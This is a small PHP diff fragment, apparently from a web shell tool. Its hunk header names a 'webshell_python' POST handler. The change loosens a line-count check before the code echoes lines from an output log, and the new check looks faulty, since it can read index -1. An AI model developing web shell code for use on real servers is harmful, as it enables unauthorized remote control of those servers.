@@ -193,7 +193,7 @@ if(isset($_POST["webshell_python"])){
     echo "<script></script>";
     $fewLines = explode("\n", fread($myfile,filesize("./output.log")));
     $lastLine = explode(";", $fewLines[count($fewLines) -1]);
-    if(count($fewLines) > 2){
+    if(count($fewLines) > 0){
         echo utf8_encode($fewLines[count($fewLines)-2]);
         echo "<br>";
         
